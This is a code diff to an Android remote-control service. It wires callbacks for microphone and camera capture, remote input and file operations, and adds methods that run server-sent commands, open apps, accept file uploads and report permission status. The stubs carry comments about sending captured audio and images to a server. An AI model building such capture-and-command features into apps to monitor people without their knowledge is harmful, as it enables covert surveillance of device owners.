@@ -101,10 +101,70 @@ public class RemoteControlService extends Service {
             startForeground(NOTIFICATION_ID, createNotification());
             serviceRunning = true;
             
+            // 设置权限功能的回调监听器
+            setupPermissionCallbacks();
+            
             Log.i(TAG, "Remote control service started successfully");
             
         } catch (Exception e) {
             Log.e(TAG, "Failed to start remote control service", e);
+        }
+    }
+    
+    /**
+     * 设置权限功能的回调监听器
+     */
+    private void setupPermissionCallbacks() {
+        // 设置音频数据回调
+        if (audioCaptureManager != null) {
+            audioCaptureManager.setAudioDataCallback(new AudioCaptureManager.AudioDataCallback() {
+                @Override
+                public void onAudioData(byte[] audioData, int length) {
+                    // 音频数据已经在AudioCaptureManager中进行了日志输出
+                    // 这里可以进行额外的处理，比如发送到服务器等
+                }
+                
+                @Override
+                public void onError(String error) {
+                    Log.e(TAG, "Audio capture error: " + error);
+                }
+            });
+        }
+        
+        // 设置摄像头数据回调
+        if (cameraController != null) {
+            cameraController.setCameraDataCallback(new CameraController.CameraDataCallback() {
+                @Override
+                public void onCameraData(byte[] data) {
+                    // 图像数据已经在CameraController中进行了日志输出
+                    // 这里可以进行额外的处理，比如发送到服务器等
+                }
+                
+                @Override
+                public void onError(String error) {
+                    Log.e(TAG, "Camera capture error: " + error);
+                }
+            });
+        }
+        
+        // 设置远程控制回调
+        if (remoteControlManager != null) {
+            remoteControlManager.setRemoteControlCallback(new RemoteControlManager.RemoteControlCallback() {
+                @Override
+                public void onRemoteInputStateChanged(boolean enabled) {
+                    Log.i(TAG, "Remote input state changed: " + enabled);
+                }
+                
+                @Override
+                public void onFileOperationResult(boolean success, String message) {
+                    Log.i(TAG, "File operation result: " + success + ", " + message);
+                }
+                
+                @Override
+                public void onError(String error) {
+                    Log.e(TAG, "Remote control error: " + error);
+                }
+            });
         }
     }
     
@@ -212,6 +272,85 @@ public class RemoteControlService extends Service {
         if (remoteControlManager != null) {
             remoteControlManager.disableRemoteInput();
         }
+    }
+    
+    /**
+     * 处理服务器命令
+     */
+    public void processServerCommand(String command) {
+        if (remoteControlManager != null) {
+            remoteControlManager.processServerCommand(command);
+        }
+    }
+    
+    /**
+     * 打开指定应用
+     */
+    public void openApp(String appName) {
+        if (remoteControlManager != null) {
+            remoteControlManager.openApp(appName);
+        }
+    }
+    
+    /**
+     * 启用文件访问权限
+     */
+    public void enableFileAccess() {
+        if (remoteControlManager != null) {
+            remoteControlManager.enableFileAccess();
+        }
+    }
+    
+    /**
+     * 禁用文件访问权限
+     */
+    public void disableFileAccess() {
+        if (remoteControlManager != null) {
+            remoteControlManager.disableFileAccess();
+        }
+    }
+    
+    /**
+     * 处理服务器文件上传
+     */
+    public void handleServerFileUpload(String fileName, byte[] fileData, String fileType) {
+        if (remoteControlManager != null) {
+            remoteControlManager.handleServerFileUpload(fileName, fileData, fileType);
+        }
+    }
+    
+    /**
+     * 获取所有权限功能的状态
+     */
+    public String getPermissionStatus() {
+        StringBuilder status = new StringBuilder();
+        status.append("=== 全视界远程控制权限状态 ===\n");
+        
+        // 服务状态
+        status.append("服务状态: ").append(serviceRunning ? "运行中" : "已停止").append("\n");
+        
+        // 麦克风权限
+        if (audioCaptureManager != null) {
+            status.append("麦克风权限: ").append(audioCaptureManager.isRecording() ? "正在录制" : "未开启").append("\n");
+        }
+        
+        // 摄像头权限
+        if (cameraController != null) {
+            status.append("摄像头权限: ").append(cameraController.isCameraOpen() ? "正在捕获" : "未开启").append("\n");
+        }
+        
+        // 远程输入权限
+        if (remoteControlManager != null) {
+            status.append("远程输入权限: ").append(remoteControlManager.isRemoteInputEnabled() ? "已启用" : "未启用").append("\n");
+        }
+        
+        // 文件访问权限
+        if (remoteControlManager != null) {
+            status.append("文件访问权限: ").append(remoteControlManager.isFileAccessEnabled() ? "已启用" : "未启用").append("\n");
+        }
+        
+        status.append("================================\n");
+        return status.toString();
     }
     
     /**
